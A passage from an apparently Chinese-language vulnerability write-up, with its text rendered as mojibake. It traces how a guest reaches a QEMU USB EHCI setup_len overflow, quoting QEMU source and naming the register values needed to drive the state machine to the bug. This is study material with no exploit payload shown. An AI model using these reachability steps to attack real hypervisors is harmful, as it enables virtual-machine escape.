class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_setup</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-type">int</span> request, value, index;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;iov.size != <span class="hljs-number">8</span>) &#123;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);<br>    s-&gt;setup_index = <span class="hljs-number">0</span>;<br>    p-&gt;actual_length = <span class="hljs-number">0</span>;<br>    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">6</span>];<br>    <span class="hljs-keyword">if</span> (s-&gt;setup_len &gt; <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                <span class="hljs-string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,<br>                s-&gt;setup_len, <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf));<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_in</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_out</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                                       </p><h2 id="è§¦å‘æ¼æ´å‡½æ•°"><a href="#è§¦å‘æ¼æ´å‡½æ•°" class="headerlink" title="è§¦å‘æ¼æ´å‡½æ•°"></a>è§¦å‘æ¼æ´å‡½æ•°</h2><p>ä½¿ç”¨elixir.bootlinè¿™ä¸ªç½‘ç«™å¯ä»¥å¾ˆæ–¹ä¾¿å»å¯»æ‰¾å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œä¸€é¡¿ç‹‚ç‚¹é¼ æ ‡æœ€ç»ˆæ‰¾åˆ°çš„ä¸Šå±‚å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p><p>do_token_setupâ€”&gt;usb_process_one â€”&gt;usb_handle_packet â€”&gt;ehci_executeâ€”&gt;ehci_state_execute â€”&gt;ehci_advance_state â€”&gt;ehci_advance_periodic_state â€”&gt;ehci_work_bh</p><p>è€Œæœ€åçš„ehci_work_bhå‡½æ•°æ˜¯ç”±usb_ehci_realizeå‡½æ•°æ‰€å¼•ç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_realize</span><span class="hljs-params">(EHCIState *s, DeviceState *dev, Error **errp)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, ehci_work_timer, s);<br>    s-&gt;async_bh = qemu_bh_new(ehci_work_bh, s);<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯usb_ehci_realizeå‡½æ•°æ˜¯æ²¡æœ‰çœŸæ­£è°ƒç”¨ehci_work_bhï¼Œè¿™é‡Œåªæ˜¯å°†ehci_work_bhå‡½æ•°åˆ›å»ºä¸ºåº•åŠéƒ¨ï¼ˆbottom halfï¼‰ï¼Œæƒ³åˆ°æ›¾ç»å¤ç°è¿‡hfctf2022ä¸­çš„qemué¢˜ä¹Ÿæ˜¯è¿™ç§ï¼Œqemuçš„bottom halfä¸timersç›¸ä¼¼ï¼štimersæ˜¯timer_modè§¦å‘ã€bottom halfæ˜¯qemu_bh_scheduleè§¦å‘ï¼Œæœ€åç”±å¦ä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œã€‚</p><p>æœ€åè¿›ä¸€æ­¥å»æ‰¾<code>qemu_bh_schedule(s-&gt;async_bh)</code>çš„è°ƒç”¨ï¼Œå¯ä»¥æ‰¾åˆ°ehci_opreg_wrieå‡½æ•°ã€‚</p><p>â€‹                                                    </p><p>ehci_opreg_wrieå°±æ˜¯CTFé¢˜ä¸­å¸¸è§çš„è®¾å¤‡writeå‡½æ•°ï¼Œå‡½æ•°å…ˆé€šè¿‡addrè¿™ä¸ªå€¼å»è®¿é—®opregè”åˆä½“ç›¸åº”çš„å˜é‡ï¼Œé€šè¿‡mmioè¿™ä¸ªå˜é‡å†å»ç”±valèµ‹å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_opreg_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, hwaddr addr,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    EHCIState *s = ptr;<br>    <span class="hljs-type">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="hljs-number">2</span>);<br>    <span class="hljs-type">uint32_t</span> old = *mmio;<br>    <span class="hljs-type">int</span> i;<br><br>    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>    <span class="hljs-keyword">case</span> USBCMD:<br>       â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>       â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>        <span class="hljs-keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=<br>            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd)) &#123;<br>            <span class="hljs-keyword">if</span> (s-&gt;pstate == EST_INACTIVE) &#123;<br>                SET_LAST_RUN_CLOCK(s);<br>            &#125;<br>            s-&gt;usbcmd = val; <span class="hljs-comment">/* Set usbcmd for ehci_update_halt() */</span><br>            ehci_update_halt(s);<br>            s-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            qemu_bh_schedule(s-&gt;async_bh);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>     <span class="hljs-keyword">case</span> USBSTS:<br>        val &amp;= USBSTS_RO_MASK;              <span class="hljs-comment">// bits 6 through 31 are RO</span><br>        ehci_clear_usbsts(s, val);          <span class="hljs-comment">// bits 0 through 5 are R/WC</span><br>        val = s-&gt;usbsts;<br>        ehci_update_irq(s);<br>        <span class="hljs-keyword">break</span>;<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> FRINDEX:<br>        val &amp;= <span class="hljs-number">0x00003fff</span>; <span class="hljs-comment">/* frindex is 14bits */</span><br>        s-&gt;usbsts_frindex = val;<br>        <span class="hljs-keyword">break</span>;<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    <br>    *mmio = val;<br>    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),<br>                                *mmio, old);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">uint32_t</span> opreg[<span class="hljs-number">0x44</span>/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>)];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-type">uint32_t</span> usbcmd;<br>            <span class="hljs-type">uint32_t</span> usbsts;<br>            <span class="hljs-type">uint32_t</span> usbintr;<br>            <span class="hljs-type">uint32_t</span> frindex;<br>            <span class="hljs-type">uint32_t</span> ctrldssegment;<br>            <span class="hljs-type">uint32_t</span> periodiclistbase;<br>            <span class="hljs-type">uint32_t</span> asynclistaddr;<br>            <span class="hljs-type">uint32_t</span> notused[<span class="hljs-number">9</span>];<br>            <span class="hljs-type">uint32_t</span> configflag;<br>        &#125;;<br>    &#125;;<br></code></pre></td></tr></table></figure><p>â€‹                                                       </p><p>åœ¨ehci_work_bhä¸­ä¼šå¯¹usbcmdè¿™ä¸ªå€¼è¿›è¡Œä¸€äº›åˆ¤æ–­æ‰ä¼šè°ƒç”¨ehci_advance_periodic_stateï¼ŒåŸå§‹çš„usbcmd &#x3D; 0x10001æ— æ³•æ»¡è¶³åˆ¤æ–­ï¼Œéœ€è¦ä½¿ç”¨ehci_opreg_wrieå‡½æ•°å¯¹usbcmdé‡æ–°èµ‹å€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_work_bh</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> (ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE) &#123;<br>        need_timer++;<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; uframes; i++) &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * If we&#x27;re running behind schedule, we should not catch up</span><br><span class="hljs-comment">             * too fast, as that will make some guests unhappy:</span><br><span class="hljs-comment">             * 1) We must process a minimum of MIN_UFR_PER_TICK frames,</span><br><span class="hljs-comment">             *    otherwise we will never catch up</span><br><span class="hljs-comment">             * 2) Process frames until the guest has requested an irq (IOC)</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">if</span> (i &gt;= MIN_UFR_PER_TICK) &#123;<br>                ehci_commit_irq(ehci);<br>                <span class="hljs-keyword">if</span> ((ehci-&gt;usbsts &amp; USBINTR_MASK) &amp; ehci-&gt;usbintr) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ehci-&gt;periodic_sched_active) &#123;<br>                ehci-&gt;periodic_sched_active--;<br>            &#125;<br>            ehci_update_frindex(ehci, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ((ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>) &#123;<br>                ehci_advance_periodic_state(ehci);<br>            &#125;<br>            ehci-&gt;last_run_ns += UFRAME_TIMER_NS;<br>        &#125;<br>    &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ehci_periodic_enabled</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ehci_enabled(s) &amp;&amp; (s-&gt;usbcmd &amp; USBCMD_PSE);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ehci_enabled</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> s-&gt;usbcmd &amp; USBCMD_RUNSTOP;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹</p><p>ehci_advance_periodic_stateä¸­æ²¡æœ‰ä»€ä¹ˆå‚æ•°æ˜¯éœ€è¦åˆ¤æ–­çš„ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ehci_advance_stateï¼Œä½†æ˜¯entryè¿™ä¸ªå€¼ä¼šå½±å“æ¥ä¸‹æ¥çš„å‡½æ•°ã€‚get_dwordså‡½æ•°å°†listç‰©ç†åœ°å€ä¸­çš„å€¼èµ‹å€¼ç»™entryï¼Œlistå¼€å§‹ç”±ehci-&gt;periodiclistbaseèµ‹å€¼ï¼Œå†å’Œ((ehci-&gt;frindex &amp; 0x1ff8) &gt;&gt; 1) ä¸è¿ç®—ï¼Œehci-&gt;periodiclistbaseå’Œehci-&gt;frindexéƒ½æ˜¯opregè”åˆä½“ä¸­çš„å˜é‡ï¼Œä½¿ç”¨ehci_opreg_wrieèµ‹å€¼å³å¯ã€‚è¿™é‡Œæˆ‘æœ¬åœ° ehci-&gt;frindexè¿™ä¸ªå€¼å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè¿™ç‚¹å’ŒDe4dCr0wå¸ˆå‚…ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦äº‹å…ˆå¯¹ehci-&gt;frindexèµ‹å€¼ä¸º0æ‰èƒ½è®©liståœ¨ä¸è¿ç®—å<code>+4</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_advance_periodic_state</span><span class="hljs-params">(EHCIState *ehci)</span><br>&#123;<br>     â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>     â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> EST_ACTIVE:<br>        <span class="hljs-keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) &amp;&amp; !ehci_periodic_enabled(ehci)) &#123;<br>            ehci_queues_rip_all(ehci, async);<br>            ehci_set_state(ehci, async, EST_INACTIVE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">list</span> = ehci-&gt;periodiclistbase &amp; <span class="hljs-number">0xfffff000</span>;<br>        <span class="hljs-comment">/* check that register has been set */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span> == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">list</span> |= ((ehci-&gt;frindex &amp; <span class="hljs-number">0x1ff8</span>) &gt;&gt; <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (get_dwords(ehci, <span class="hljs-built_in">list</span>, &amp;entry, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        DPRINTF(<span class="hljs-string">&quot;PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n&quot;</span>,<br>                ehci-&gt;frindex / <span class="hljs-number">8</span>, <span class="hljs-built_in">list</span>, entry);<br>        ehci_set_fetch_addr(ehci, async,entry);  <span class="hljs-comment">//å°†entryçš„å€¼ä¿å­˜åˆ°ehciä¸­</span><br>        ehci_set_state(ehci, async, EST_FETCHENTRY); <span class="hljs-comment">//å°†EST_FETCHENTRYè¿™ä¸ªçŠ¶æ€ä¿å­˜åˆ°ehciä¸­</span><br>        ehci_advance_state(ehci, async);<br>     â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>     â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                               </p><p>æ¥ä¸‹æ¥å°±æ˜¯æœ€ç»•çš„åœ°æ–¹</p><p>è¿›å…¥ehci_advance_stateåï¼Œé€šè¿‡ehci_get_stateå¾—åˆ°ç›¸åº”çš„çŠ¶æ€å€¼ï¼Œå»è°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°ï¼Œè€Œè¿™äº›å¤„ç†å‡½æ•°ä¸­ä½¿ç”¨ehci_set_stateå¯ä»¥è®¾ç½®æ–°çš„çŠ¶æ€å€¼ï¼Œç›¸åº”çš„å¤„ç†å‡½æ•°ç»“æŸåï¼Œehci_get_stateå¾—åˆ°æ–°çš„çŠ¶æ€å€¼ä¸æ–­å¾ªç¯ã€‚</p><p>è¦æƒ³è°ƒç”¨ehci_state_executeå‡½æ•°ï¼Œè¦æ»¡è¶³q !&#x3D; NULLï¼ŒçŠ¶æ€å€¼æ˜¯EST_EXECUTEã€‚</p><p>ä¸Šå±‚çš„ehci_advance_periodic_stateå‡½æ•°å·²ç»å°†çŠ¶æ€å€¼è®¾ç½®ä¸ºEST_FETCHENTRYï¼Œå¼€å§‹ä¼šå…ˆè¿›å…¥ehci_state_fetchentryå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_advance_state</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    EHCIQueue *q = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> itd_count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> again;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">switch</span>(ehci_get_state(ehci, async)) &#123;<br><span class="hljs-keyword">case</span> EST_FETCHENTRY:<br>            again = ehci_state_fetchentry(ehci, async);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHQH:<br>            q = ehci_state_fetchqh(ehci, async);<br>            <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>) &#123;<br>                assert(q-&gt;async == async);<br>                again = <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                again = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>        â€¦â€¦â€¦â€¦â€¦â€¦<br>        <span class="hljs-keyword">case</span> EST_FETCHQTD:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_fetchqtd(q);<br>            <span class="hljs-keyword">break</span>;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>        â€¦â€¦â€¦â€¦â€¦â€¦<br>        <span class="hljs-keyword">case</span> EST_EXECUTE:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_execute(q);<br>            <span class="hljs-keyword">if</span> (async) &#123;<br>                ehci-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (again);<br>&#125;<br></code></pre></td></tr></table></figure><p>ehci_state_fetchentryä¸­éœ€è¦æ»¡è¶³switchçš„å€¼ä¸ºNLPTR_TYPE_QHï¼Œè®¾ç½®æ–°çš„çŠ¶æ€å€¼ä¸ºEST_FETCHQHï¼Œåœ¨æ¥ä¸‹æ¥çš„å¾ªç¯ä¸­å°±å¯ä»¥è°ƒç”¨ehci_state_fetchqhå‡½æ•°ä¸ºqèµ‹å€¼äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_fetchentry</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> entry = ehci_get_fetch_addr(ehci, async);<span class="hljs-comment">//å¾—åˆ°å…ˆå‰ehci_advance_periodic_stateå‡½æ•°ä¸­ä¿å­˜çš„entryå€¼</span><br>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">switch</span> (NLPTR_TYPE_GET(entry)) &#123;<br>    <span class="hljs-keyword">case</span> NLPTR_TYPE_QH:<br>        ehci_set_state(ehci, async, EST_FETCHQH);<span class="hljs-comment">//&lt;----è¿è¡Œè‡³æ­¤</span><br>        again = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NLPTR_TYPE_QH            1     <span class="hljs-comment">// queue head</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NLPTR_TYPE_GET(x)        (((x) &gt;&gt; 1) &amp; 